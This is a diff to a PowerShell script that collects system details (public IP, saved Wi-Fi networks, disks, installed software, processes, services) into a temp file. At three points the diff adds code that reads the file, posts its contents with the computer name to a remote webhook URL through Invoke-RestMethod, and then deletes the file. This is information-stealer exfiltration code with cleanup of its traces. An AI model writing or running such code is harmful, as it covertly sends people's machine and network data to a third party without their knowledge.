@@ -65,6 +65,16 @@ $outpath = "$env:temp\systeminfo.txt"
 "Language           : $systemLanguage" | Out-File -FilePath $outpath -Encoding ASCII -Append
 "Keyboard Layout    : $keyboardLayoutID" | Out-File -FilePath $outpath -Encoding ASCII -Append
 "`n" | Out-File -FilePath $outpath -Encoding ASCII -Append
+
+$Pathsys = "$env:temp\systeminfo.txt"
+$msgsys = Get-Content -Path $Pathsys -Raw 
+$escmsgsys = $msgsys -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
+$jsonsys = @{"username" = "$env:COMPUTERNAME" 
+            "content" = $escmsgsys} | ConvertTo-Json
+Start-Sleep 1
+Invoke-RestMethod -Uri $whuri -Method Post -ContentType "application/json" -Body $jsonsys
+Remove-Item -Path $Pathsys -force
+
 "NETWORK INFO `n ======================================================================" | Out-File -FilePath $outpath -Encoding ASCII -Append
 "Public IP          : $computerPubIP" | Out-File -FilePath $outpath -Encoding ASCII -Append
 "Saved Networks     : `n$outssid" | Out-File -FilePath $outpath -Encoding ASCII -Append
@@ -85,10 +95,32 @@ $outpath = "$env:temp\systeminfo.txt"
 "HDD Info           `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
 ($Hdds| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
 "`n" | Out-File -FilePath $outpath -Encoding ASCII -Append
+
+$Pathsys = "$env:temp\systeminfo.txt"
+$msgsys = Get-Content -Path $Pathsys -Raw 
+$escmsgsys = $msgsys -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
+$jsonsys = @{"username" = "$env:COMPUTERNAME" 
+            "content" = $escmsgsys} | ConvertTo-Json
+Start-Sleep 1
+Invoke-RestMethod -Uri $whuri -Method Post -ContentType "application/json" -Body $jsonsys
+Remove-Item -Path $Pathsys -force
+
 "SOFTWARE INFO `n ======================================================================" | Out-File -FilePath $outpath -Encoding ASCII -Append
 "Installed Software `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
 ($software| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
 "Processes          `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
+
+
+$Pathsys = "$env:temp\systeminfo.txt"
+$msgsys = Get-Content -Path $Pathsys -Raw 
+$escmsgsys = $msgsys -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
+$jsonsys = @{"username" = "$env:COMPUTERNAME" 
+            "content" = $escmsgsys} | ConvertTo-Json
+Start-Sleep 1
+Invoke-RestMethod -Uri $whuri -Method Post -ContentType "application/json" -Body $jsonsys
+Remove-Item -Path $Pathsys -force
+
+
 ($process| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
 "Services           `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
 ($service| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
